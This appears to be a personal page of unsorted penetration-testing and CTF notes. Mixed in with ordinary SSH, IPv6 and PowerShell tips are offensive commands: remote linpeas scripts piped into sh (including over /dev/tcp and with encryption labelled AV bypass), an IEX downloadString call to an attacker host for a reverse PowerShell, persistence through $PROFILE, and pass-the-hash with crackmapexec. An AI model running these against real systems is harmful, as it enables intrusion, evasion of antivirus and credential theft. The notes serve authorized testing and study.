---
description: >-
  Misc notes that still need to be sorted through and sent to their proper
  homes.
---

# Unsorted

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
{% endhint %}

## Markdown

```text
{% hint style="warning" %} Warning box. Looks nice! {% endhint %}
```

{% hint style="danger" %}
Text between these will show up in a warning box. Looks nice! 

_Can click on the icon to change it to something appropriate \( Changes style, I think. Gitbook only?\)._
{% endhint %}

## -----

[https://8gwifi.org/PemParserFunctions.jsp](https://8gwifi.org/PemParserFunctions.jsp) &lt;--extract information from various digital certificates

## -----

locate all files that symlink to this\_file: `find -L / -samefile path/to/<this_file>`

## -----

## SSH Keys

```text
AWS will NOT accept this file.
You have to strip off the -----BEGIN PUBLIC KEY----- and -----END PUBLIC KEY----- from the file. Save it and import and it should work in AWS.
```

and if you need to convert this format to ssh-rsa AAAAB3NzaC1y.... run : `ssh-keygen -f PublicKey.pub -i -mPKCS8`

For those interested in the details - you can see what's inside the public key file \(generated as explained above\), by doing this:- \`\`\`openssl rsa -noout -text -inform PEM -in key.pub -pubin or for the private key file, this:- openssl rsa -noout -text -in key.private which outputs as text on the console the actual components of the key \(modulus, exponents, primes, ...\)

````` extract public key from private key:```openssl rsa -in privkey.pem -pubout -out key.pub\`

## -----

Powershell wget [http://blog.stackexchange.com/](http://blog.stackexchange.com/) -OutFile out.html wget is an alias for Invoke-WebRequest

## -----

Windows enumeration: whoami /all net use z: \\ tasklist /v \(verbose\) netstat -an Get-WmiObject -class Win32\_UserAccount \[-filter "LocalAccount=True"\]

## -----

./winpeas.exe cmd

## -----

aquatone ?? - pulls up series of websites and takes screenshots

## Ciphers 

[https://www.boxentriq.com/code-breaking](https://www.boxentriq.com/code-breaking) &lt;-- useful site which can help identiry type of cipher. [https://www.dcode.fr](https://www.dcode.fr) &lt;-- one of the best sites I have found with many decoders for many types of ciphers. github Cyber Chef &lt;-- very useful for chained ciphers which require different steps to solve, can be limited. can decrypt certificates Fernet \(symmetric encryption\) - looks like base64 but decodes to garbage, in two parts. first part \(32 bytes\) is the key. Uses 128-bit AES in CBC mode and PKCS7 padding, with HMAC using SHA256 for authentication. IV is created from os.random\(\).

> decode fernet @ [https://asecuritysite.com/encryption/ferdecode](https://asecuritysite.com/encryption/ferdecode) &lt;-- Will also give the IV and timestamp \(could be useful!\) more info about this @ [https://cryptography.io/en/latest/fernet](https://cryptography.io/en/latest/fernet) python from cryptography.fernet import Fernet key = Fernet.generate\_key\(\) f = Fernet\(key\) token = f.encrypt\(b"this is my key"\) print\('the key is ' + key + '/nThe cipher text is ' + token\) ==========decrypt from cryptography.fernet import Fernet key = 'input key here' f = Fernet\(key\) token = 'cipher text here' print\(f.decrypt\(token\)\)

esoteric inferno encryption Malbolge programming language &lt;--text from base64 looks like random text, but not complete garbage \(!unprintable\) ^[https://en.wikipedia.org/wiki/Malbolge](https://en.wikipedia.org/wiki/Malbolge) // [https://www.tutorialspoint.com/execute\_malbolge\_online.php](https://www.tutorialspoint.com/execute_malbolge_online.php)

## -----

shortcut for all ports: `nmap -p-`

## -----

Firefox Browser plugins:Tampermonkey \(userscript manager\); Cookie Manager+;

## -----

signing APK files: [IppSec:HHC2016 - Debug](https://www.youtube.com/watch?v=fcemTQaosOQ)

## HEX

view hex of file only: `xxd -p`

reverse from hex: `xxd -r -p > <filename>`

## msfvenom 

custom exploit making:\[Ippsec:HacktheBox - Granny & Grandpa\]

```bash
msfvenom -p <payload> LHOST=<lhost> etc... -f <filetype [use --help-formats first]>
```

## -----

injecting IPs when '.' is disallowed: convert dotted\_decimal to decimal value -[ip2dh](https://github.com/4ndr34z/MyScripts/blob/master/ip2dh.py)

## -----

[AndroidAssetStudio](https://romannurik.github.io/AndroidAssetStudio/index.html)

## Port knocking

[Ippsec:HackTheBox - Nineveh](https://www.youtube.com/watch?v=K9DKULxSBK4)

iptables knockd:

```bash
for i in <port> <port> <port>; do nmap -Pn -p $i --host_timeout 201 --max_retries 0 <ip>; done
```

## -----

recursively download all files in hosted folder: `wget -r <ip:port>`

## -----

[Hurricane Electric ISP](http://he.net/): Ippsec uses with IPv6 as a psuedo-VPN in [HTB:Sneaky](https://www.youtube.com/watch?v=1UGxjqTnuyo)

## IPv6

primer: [Ippsec:HacktheBox - Sneaky](https://www.youtube.com/watch?v=1UGxjqTnuyo)

```text
fe80::/10 - febf:ffff:ffff:ffff:ffff:ffff:ffff:ffff Unique Link Local 169.254.x.x APIPA 
(built from MAC address on Linux, 7th bit flips, adds ff:fe in the center)

fc00::/7 - fdff:ffff:ffff:ffff:ffff:ffff:ffff:ffff Unique Local Unicast 10.x.x.x, 172.16.x.x, 192.168.x.x 

2000::/3 - Global Unicast routable 

ff02::1 - Multicast All Nodes 

ff02::2 Multicast ROUTER nodes
```

ip6tables - iptables for ipv6

## PHP

[https://www.php.net/manual/en/features.commandline.webserver.php](https://www.php.net/manual/en/features.commandline.webserver.php) When starting php -S on a mac \(in my case macOS Sierra\) to host a local server, I had trouble with connecting from legacy Java. As it turned out, if you started the php server with `php -S localhost:80` the server will be started with ipv6 support only! To access it via ipv4, you need to change the start up command like so: `php -S 127.0.0.1:80` which starts server in ipv4 mode only.

It’s not mentioned directly, and may not be obvious, but you can also use this to create a virtual host. This, of course, requires the help of your hosts file. Here are the steps:

```text
1    /etc/hosts
    127.0.0.1    www.example.com
2    cd [root folder]
    php -S www.example.com:8000
3    Browser:
    http://www.example.com:8000/index.php
```

In order to set project specific configuration options, simply add a php.ini file to your project, and then run the built-in server with this flag: `php -S localhost:8000 -c php.ini`

Example \#6 Accessing the CLI Web Server From Remote Machines You can make the web server accessible on port 8000 to any interface with: `$ php -S 0.0.0.0:8000`

Example \#2 Starting with a specific document root directory

```text
$ cd ~/public_html
$ php -S localhost:8000 -t foo/
Listening on localhost:8000
Document root is /home/me/public_html/foo
```

## -----

`ls /usr/share/nmap/scripts/ |grep smb` - find nmap scripts related to smb, search this folder for any scripts for a service you want to enumerate

## -----

Cisco Smart Install Client Service Available -Then, we can pull the configs with SIET: `siet.py -i 10.10.10.10 -g` SIET: [https://github.com/Sab0tag3d/SIET/](https://github.com/Sab0tag3d/SIET/)

## Active Directory

use LDAPDomainDump to gather the AD schema details.[LDAPDomainDump](https://github.com/dirkjanm/ldapdomaindump%20)

ADExplorer: [https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)

## pass the hash 

responder.py - or - write .lnk files to writeable shares that point back to attacker - capture hashes and relay attacks enable smb signing and limit llmnr \(group policy\) respounder - detect responder - responder guard

`crackmapexec smb ip -u <name> -H <hash> --lsa` - pass the hash; drsuapi - search in wireshark to detect - win long id 4624 user\_reported\_sid: S-1-0-0 logon\_process\_name:ntlmssp

Defense:[https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win\_pass\_the\_hash.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_pass_the_hash.yml); In our lab environment, we could consistently catch the pass-the-hash attacks by monitoring event\_id : 4624, with logon types of ntlmssp, and the security SID at S-1-0-0 \(NULL / NOBODY\). You too can instrument this attack!

## -----

SIGMA - SIGMAC - generic event log formats for siems

## -----

Plumhound -

## -----

Bad blood - create domain for your \(defense tool, or lab setup\) fills AD with objects, don't use in production! \(cant create sessions\)

## `linpeas.sh`

Quick Start

#### From github

`curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh`

#### Local network

`sudo python -m SimpleHTTPServer 80` `curl 10.10.10.10/linpeas.sh | sh`

#### Without curl

`sudo nc -q 5 -lvnp 80 < linpeas.sh` `cat < /dev/tcp/10.10.10.10/80 | sh`

#### Output to file

`linpeas -a > /dev/shm/linpeas.txt` -a to execute all the checks.

`less -r /dev/shm/linpeas.txt #Read with colors`

#### AV bypass

#### open-ssl encryption

`openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc` `sudo python -m SimpleHTTPServer 80` \#Start HTTP server `curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh` \# Download from the victim

#### Base64 encoded

```text
#Start HTTP server 
base64 -w0 linpeas.sh > lp.enc sudo python -m SimpleHTTPServer 80 
#Download from the victim Use the parameter 
curl 10.10.10.10/lp.enc | base64 -d | sh 


```

### Winpeas

#### Windows icacls file permissions

[https://ss64.com/nt/icacls.html](https://ss64.com/nt/icacls.html) Interesting permissions

D - Delete access F - Full access \(Edit\_Permissions+Create+Delete+Read+Write\) N - No access M - Modify access \(Create+Delete+Read+Write\) RX - Read and eXecute access R - Read-only access W - Write-only access

winpeas.exe cmd searchall searchfast \#cmd commands, search all filenames and avoid sleeping \(noisy - CTFs\) 

winpeas.exe \#Will execute all checks except the ones that use a CMD 

winpeas.exe cmd \#All checks 

winpeas.exe systeminfo userinfo \#Only systeminfo and userinfo checks executed 

winpeas.exe notcolor \#Do not color the output 

winpeas.exe cmd wait \#cmd commands and wait between tests

In Linux the ouput will be colored using ANSI colors. If you are executing winpeas.exe from a Windows console, you need to set a registry value to see the colors \(and open a new CMD\): `REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1`

### -----

[https://github.com/wpscanteam/wpscan/issues/190\#issuecomment-18087644](https://github.com/wpscanteam/wpscan/issues/190#issuecomment-18087644) `iconv -f ISO-8859-1 -t UTF-8 /pentest/passwords/wordlists/rockyou.txt > rockyou_utf8.txt`

### -----

[https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/](https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/) [https://activedirectorypro.com/powershell-commands/](https://activedirectorypro.com/powershell-commands/) add commands from these pages

### -----

[https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell](https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell) look for text in a file and lists its name and contents. 

Shorthand \(aliased\) version:

```text
ls -R|?{$_|Select-String 'dummy'}|%{$_.FullName;gc $_}
```

Remove `;gc $_` to only list the filenames. Then you can extract to Linux and use better text manipulation tools like `strings` and `grep` 

Full version: 

```text
Get-ChildItem -Recurse | Where-Object {(Select-String -InputObject $_ -Pattern 'dummy' -Quiet) -eq $true} | ForEach-Object {Write-Output $_; Get-Content $_}
```

Explanation:

```text
# Get a listing of all files within this folder and its subfolders.
Get-ChildItem -Recurse |

# Filter files according to a script.
Where-Object {
    # Pick only the files that contain the string 'dummy'.
    # Note: The -Quiet parameter tells Select-String to only return a Boolean. This is preferred if you just need to use Select-String as part of a filter, and don't need the output.
    (Select-String -InputObject $_ -Pattern 'dummy' -Quiet) -eq $true
} |

# Run commands against each object found.
ForEach-Object {
    # Output the file properties.
    Write-Output $_;

    # Output the file's contents.
    Get-Content $_
}
```

`ls -R|?{$_|Select-String 'dummy'}|%{$_;gc $_}`

Aside from the obvious use of aliases, collapsing of whitespace, and truncation of parameter names, you may want to note the following significant differences between the "full" versions and the "golfed" version:

`Select-String` was swapped to use piped input instead of `-InputObject`. The `-Pattern` parameter name was omitted from `Select-String`, as use of that parameter's name is optional. The `-Quiet` option was dropped from `Select-String`. The filter will still work, but it will take longer since `Select-String` will process each complete file instead of stopping after the first matching line. `-eq $true` was omitted from the filter rule. When a filter script already returns a Boolean, you do not need to add a comparison operator and object if you just want it to work when the Boolean is true. \(Also note that this will work for some non-Booleans, like in this script. Here, a match will result in a populated array object, which is treated as true, while a non-match will return an empty array which is treated as false.\) `Write-Output` was omitted. PowerShell will try to do this as a default action if an object is given without a command. If you don't need all the file's properties, and just want the full path on one line before the file contents, you could use this instead:

`ls -R|?{$_|Select-String 'dummy'}|%{$_.FullName;gc $_}`

### -----

[https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### -----

[https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)

### -----

[https://vulndev.io/notes/2019/01/01/windows.html](https://vulndev.io/notes/2019/01/01/windows.html)

### -----

#### Execute .ps1 scripts on compromised machine in memory

If your are able to use `Invoke-Expresion` \(`IEX`\) this module can be imported using the following command. You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run. Notice the .ps1 extension. When using `downloadString` this will need to be a ps1 file to inject the module into memory in order to run the cmdlets.

```text
IEX (New-Object -TypeName Net.WebClient).downloadString("http://<attacker_ipv4>/ReversePowerShell.ps1")
```

`IEX` is blocked from users in most cases and `Import-Module` is monitored by things such as ATP. Downloading files to a target's machine is not always allowed in a penetration test. Another method to use is `Invoke-Command`. This can be done using the following format.

```text
Invoke-Command -ComputerName <target device> -FilePath .'\ReversePowerShell.ps1m' -Credential (Get-Credential)
```

This will execute the file and it's contents on the remote computer.

Another sneaky method would be to have the function load at the start of a new PowerShell window. This can be done by editing the `$PROFILE` file.

```text
Write-Verbose "Creates powershell profile for user"
New-Item -Path $PROFILE -ItemType File -Force
#
# The $PROFILE VARIABLE IS EITHER GOING TO BE
#    - C:\Users\<username>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
# OR
#    - C:\Users\<username>\OneDrive\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
#
# Write-Verbose "Turning this module into the PowerShell profile will import all of the commands everytime the executing user opens a PowerShell session. This means you will need to open a new powershell session after doing this in order to access the commands. I assume this can be done by just executing the "powershell" command though you may need to have a new window opened or new reverse/bind shell opened. You can also just reload the profile
cmd /c 'copy \\<attacker ip>\MyShare\ReversePowerShell.ps1 $env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.psm1

powershell.exe
# If that does not work try reloading the user profile.
& $PROFILE
```

### -----

compress files using windows, sets "Compressed" attribute \(cmd.exe\) `compact /C /S c:\MyDirectory`

### -----

[http://w3af.org/](http://w3af.org/) web application scanner

### -----

[https://base64.guru/converter/decode/file](https://base64.guru/converter/decode/file) recover files sent in base64 \(very useful for recovering files sent in emails\)

### -----

[https://osintframework.com/](https://osintframework.com/)

### -----

## Using an ALFA Wireless Adapter in Linux

[https://forums.kali.org/showthread.php?50408-Kali-2020-2-ALFA-AWUS036ACH&highlight=awus036ach](https://forums.kali.org/showthread.php?50408-Kali-2020-2-ALFA-AWUS036ACH&highlight=awus036ach)

the driver you can install with `apt-get install realtek-rtl88xxau-dkms` after reboot the wifi adapter worked on my installation.

the only thing to note - it will not work as the usual way with airmon-ng - to capture packages \(Handshake\)

```text
sudo ifconfig wlan0 down
sudo airmon-ng check kill
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

than you can work with airodump-ng

however, you wont be able to do the aireplay-ng deauth command it does not work with dualband wifi - i found no solution yet.

but scanning and capturing is possible on both wifi bands

[https://forums.kali.org/showthread.php?46019-How-to-Setup-Alfa-AWUS036ACH-RTL8812AU-on-Kali-Linux-2019-4](https://forums.kali.org/showthread.php?46019-How-to-Setup-Alfa-AWUS036ACH-RTL8812AU-on-Kali-Linux-2019-4)

After a lot of failed attempts...

I found a working solution.

and here it is...

follow these steps as it is.

NB: Unplug Your Wi-Fi Adapter while You Doing Below Steps.

• apt remove realtek-rtl88xxau-dkms && apt purge realtek-rtl88xxau-dkms

• apt update && apt upgrade • apt autoremove && apt autoclean • reboot

• apt-get dist-upgrade • reboot

• git clone [https://github.com/aircrack-ng/rtl8812au](https://github.com/aircrack-ng/rtl8812au) • cd rtl8812au • make && make install

• poweroff

Now Turn ON the PC and Plug Your Wi-Fi Adapter

[https://null-byte.wonderhowto.com/how-to/hack-5-ghz-wi-fi-networks-with-alfa-wi-fi-adapter-0203515/](https://null-byte.wonderhowto.com/how-to/hack-5-ghz-wi-fi-networks-with-alfa-wi-fi-adapter-0203515/)

[https://www.amazon.com/Network-AWUS036ACS-Wide-Coverage-Dual-Band-High-Sensitivity/dp/B0752CTSGD/?tag=whtnb-20](https://www.amazon.com/Network-AWUS036ACS-Wide-Coverage-Dual-Band-High-Sensitivity/dp/B0752CTSGD/?tag=whtnb-20)

### -----

## `command-not-found` errors

[https://stackoverflow.com/questions/19873430/command-not-found-message-when-i-try-to-add-command-in-bashrc/26976325](https://stackoverflow.com/questions/19873430/command-not-found-message-when-i-try-to-add-command-in-bashrc/26976325)

`sudo apt purge command-not-found` and install again, `sudo apt install command-not-found` then `sudo update-command-not-found` to rebuild the database

`sudo chmod ugo+r /var/lib/command-not-found/commands.db*` to fix the permissions on the database \(fixed it! Hopeuflly permanent this time\) [https://bugs.launchpad.net/command-not-found/+bug/1824000](https://bugs.launchpad.net/command-not-found/+bug/1824000)

### -----

wfuzz -c -z range,1-65535 --hl=2 [http://10.10.10.55:60000/url.php?path=localhost:FUZZ](http://10.10.10.55:60000/url.php?path=localhost:FUZZ)

burp intruder alternative for brute-forcing ports \(or any number range\)

### -----

## password file merge, sort, unique:

```text
find . -maxdepth 1 -type f ! -name ".*" -exec cat {} + | sort -u -o /path/to/sorted.txt
```

[https://unix.stackexchange.com/questions/365114/efficiently-merge-sort-unique-large-number-of-text-files](https://unix.stackexchange.com/questions/365114/efficiently-merge-sort-unique-large-number-of-text-files)

### -----

## Faster filtering with the silver searcher

https://github.com/ggreer/the\_silver\_searcher

For faster searching, use all the above grep regular expressions with the command `ag`.



### -----

take the name of each file in a directory and try to connect to a site with that filename. \(searching for web shells in Traceback- HTB\)

```text
for file in $(cat /home/zweilos/htb/traceback/webshells); do echo $file && curl -I http://10.10.10.181/$file; done
```

